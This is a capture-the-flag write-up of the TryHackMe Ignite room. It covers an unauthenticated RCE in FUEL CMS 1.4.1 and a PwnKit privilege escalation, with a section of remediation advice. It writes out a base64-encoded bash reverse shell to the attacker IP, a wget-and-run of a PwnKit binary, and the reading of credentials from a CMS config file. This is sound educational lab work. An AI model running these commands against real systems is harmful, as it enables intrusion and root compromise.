# TryHackMe — Ignite Writeup

> **Target:** `10.113.129.104`  
> **Attacker:** Kali Linux (`192.168.128.18`)  
> **Difficulty:** Easy  
> **Path used:** Nmap → FUEL CMS 1.4.1 → CVE-2018-16763 (RCE) → `www-data` shell → PwnKit (CVE-2021-4034) → root shell

---

## 1. Reconnaissance

### Nmap

```bash
nmap -sC -sV -p- 10.113.129.104
```

Key findings:

- **Port 80/tcp** — Apache httpd 2.4.18 (Ubuntu)
- **Port 22/tcp** — OpenSSH
- `robots.txt` discloses `/fuel/` → **FUEL CMS**
- Page title: `FUEL CMS`

### CMS version

Visiting `http://10.113.129.104/fuel/login/...` and inspecting the HTML/JS assets (`fuel.min.css?c=-62169955200`, `jqx_config`) confirmed **FUEL CMS 1.4.1**.

---

## 2. Exploit selection

```bash
searchsploit Fuel CMS
```

Relevant entries:

| Exploit | Path |
|---|---|
| Fuel CMS 1.4.1 — Remote Code Execution (1) | `linux/webapps/47138.py` |
| Fuel CMS 1.4.1 — Remote Code Execution (2) | `php/webapps/49487.rb` |
| Fuel CMS 1.4.1 — Remote Code Execution (3) | `php/webapps/50477.py` |

Selected **`47138.py`** — Python PoC for **CVE-2018-16763**, unauthenticated RCE via the `filter` parameter on `/fuel/pages/select/`.

```bash
searchsploit -m linux/webapps/47138.py
```

The script uses Python 2 syntax (`raw_input`, `print r.text[...]`, `urllib.quote`). To run under Python 3, apply:

```python
xxxx = input('cmd:')
print(r.text[0:dup])
import urllib.parse
urllib.parse.quote(xxxx)
```

Also set the target URL and remove/comment the Burp proxy line:

```python
url = "http://10.113.129.104"
# proxy = {"http":"http://127.0.0.1:8080"}
r = requests.get(burp0_url)
```

### Verify RCE

```bash
cmd:id
```

Output:

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Command execution confirmed as `www-data`.

---

## 3. Getting a proper reverse shell

The exploit's `system()` wrapper breaks on single quotes and on `/dev/tcp` handled by `dash` (`sh`). The reliable method is **base64-encoded bash command**:

```bash
echo 'bash -i >& /dev/tcp/192.168.128.18/4444 0>&1' | base64 -w0
```

Output:

```
YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEyOC4xOC80NDQ0IDA+JjEK
```

Listener on Kali:

```bash
nc -lvnp 4444
```

In the exploit:

```bash
cmd:echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjEyOC4xOC80NDQ0IDA+JjEK | base64 -d | bash
```

Result: interactive shell as `www-data`. Stabilised with:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
# Ctrl+Z → stty raw -echo; fg
```

### Note on the PHP warnings

The `preg_match(): Delimiter must not be alphanumeric` and `ParseError` messages are **noise from FUEL CMS itself** (it re-parses command output as PHP). They do not affect command execution.

---

## 4. Privilege escalation — PwnKit (CVE-2021-4034)

### Check polkit version

```bash
dpkg -l policykit-1
```

Output:

```
ii  policykit-1  0.105-14.1ubuntu0.4  amd64
```

Patched version for this Ubuntu branch is `0.105-14.1ubuntu0.5+esm1`, so the installed version is **vulnerable to PwnKit**.

### SUID enumeration (context)

```bash
find / -perm -4000 -type f 2>/dev/null
```

`/usr/bin/pkexec` present and SUID → exploitable.

### Transfer and run PwnKit

On **Kali**:

```bash
curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit -o PwnKit
python3 -m http.server 8000
```

On the **target** (`www-data` shell):

```bash
wget http://192.168.128.18:8000/PwnKit
chmod +x PwnKit
./PwnKit 'bash -p'
```

Result: **root shell**.

```bash
id
```

Output:

```
uid=0(root) gid=0(root) groups=0(root)
```

---

## 5. Flags

```bash
cat /root/root.txt
```

---

## 6. Alternative (intended) privesc path

The room's intended path is simpler: credentials in the FUEL CMS config file.

```bash
cat /var/www/html/fuel/application/config/database.php
```

The MySQL root password stored there is reused for the system `root` account:

```bash
su root
# enter password from database.php
```

Both paths work — PwnKit was used here to practice a kernel/polkit privesc instead of the credential-reuse route.

---

## 7. Lessons learned

- **Exposed CMS version** → quick `searchsploit` hit → unauthenticated RCE.
- **Python 2 exploits** need small porting fixes to run under Python 3.
- **Quote handling matters** — `system()` wrappers break on single quotes; base64 avoids the issue entirely.
- **`sh` ≠ `bash`** on Ubuntu (`dash` lacks `/dev/tcp`), so revshells must invoke `bash` explicitly.
- **SUID + outdated polkit** = trivial root via PwnKit.
- **Credential reuse** (DB password = system root password) is still the most common real-world privesc.

---

## 8. Remediation (defensive notes)

- Upgrade FUEL CMS to a patched release; block `/fuel/pages/select/` from untrusted access.
- Patch `policykit-1` to `0.105-14.1ubuntu0.5+esm1` or newer.
- Never store plaintext root/DB credentials in web-accessible config files.
- Avoid reusing DB passwords for system accounts.
- Enforce HTTPS; the login form transmitted credentials in cleartext over HTTP.

---

*Writeup for educational purposes — target was a personal TryHackMe lab instance.*
